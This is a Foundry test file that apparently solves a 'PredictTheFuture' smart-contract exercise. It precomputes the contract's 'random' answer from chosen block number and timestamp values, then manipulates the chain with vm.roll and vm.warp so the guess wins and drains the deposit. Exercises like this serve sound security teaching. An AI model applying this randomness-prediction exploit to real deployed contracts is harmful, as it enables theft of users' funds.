// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/PredictTheFuture.sol";

contract PredictTheFutureTest is Test {
    PredictTheFuture public predictTheFuture;
    ExploitContract public exploitContract;

    function setUp() public {
        // Deploy contracts
        predictTheFuture = (new PredictTheFuture){value: 1 ether}();
        exploitContract = new ExploitContract(predictTheFuture);
    }

    function testGuess() public {
        // Set block number and timestamp
        // Use vm.roll() and vm.warp() to change the block.number and block.timestamp respectively
        vm.roll(104293);
        vm.warp(93582192);

        // Put your solution here
        uint8 answer = uint8(uint256(keccak256(abi.encodePacked(uint256(104294), uint256(93582202))))) % 10;

        //console.log(uint256(keccak256(abi.encodePacked(uint256(104294), uint256(93582202)))));
        predictTheFuture.lockInGuess{value: 1 ether}(answer);
        vm.roll(104295);
        vm.warp(93582202);
        predictTheFuture.settle();
        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(predictTheFuture.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
